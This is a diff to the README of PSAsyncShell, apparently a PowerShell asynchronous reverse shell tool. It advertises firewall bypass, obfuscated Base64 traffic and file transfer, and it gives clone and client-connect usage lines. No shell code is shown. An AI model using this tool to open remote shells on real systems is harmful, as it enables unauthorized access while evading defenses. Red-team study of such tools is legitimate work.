@@ -5,7 +5,7 @@
 
 Unlike other reverse shells, all the communication and execution flow is done asynchronously, allowing to bypass some firewalls and some countermeasures against this kind of remote connections.
 
-Additionally, this tool features command history, screen wiping, file uploading and downloading, information splitting through chunks and reverse Base64 URL encoded traffic.
+Additionally, this tool features command history, screen wiping, file uploading and downloading, information splitting through chunks and reverse Base64 URL encoded and obfuscated traffic.
 
 
 # Requirements
@@ -42,8 +42,8 @@ git clone https://github.com/JoelGMSec/PSAsyncShell
         .\PSAsyncShell.ps1 -c server_ip server_port
           Connect the client to a PSAsyncShell server
 
- Warning: All info betwen parts will be sent unencrypted
-          Download & Upload functions don't use MultiPart
+ Warning: All data will be sent unencrypted
+          Upload function doesn't use MultiPart
 
 ```
 
